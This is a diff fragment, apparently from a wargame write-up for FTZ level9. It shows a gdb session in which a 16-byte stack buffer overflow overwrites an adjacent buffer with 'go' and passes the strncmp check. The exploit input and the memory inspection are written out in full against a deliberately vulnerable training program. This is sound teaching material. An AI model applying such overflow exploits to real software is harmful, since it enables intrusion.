@@ -74,18 +74,23 @@ main(){
 [level9@ftz tmp]$ gdb bof
 (gdb) disass main
 0x08048493 <main+115>:  call   0x8048330 <strncmp>
+
 (gdb) break *0x08048493
 Breakpoint 1 at 0x8048493: file bof.c, line 15.
+
 (gdb) run
 Starting program: /home/level9/tmp/bof
 It can be overflow : AAAAAAAAAABBBBBBgo
 &buf=0xbfffe750, &buf2=0xbfffe760, distance=0x00000010 / 16 byte
 Breakpoint 1, 0x08048493 in main () at bof.c:15
 15              if ( strncmp(buf2, "go", 2) == 0 )
+
 (gdb) x/s 0xbfffe750
 0xbfffe750:      "AAAAAAAAAABBBBBBgo\n"
+
 (gdb) x/s 0xbfffe760
 0xbfffe760:      "go\n"
+
 (gdb) continue
 Continuing.
 Good Skill!
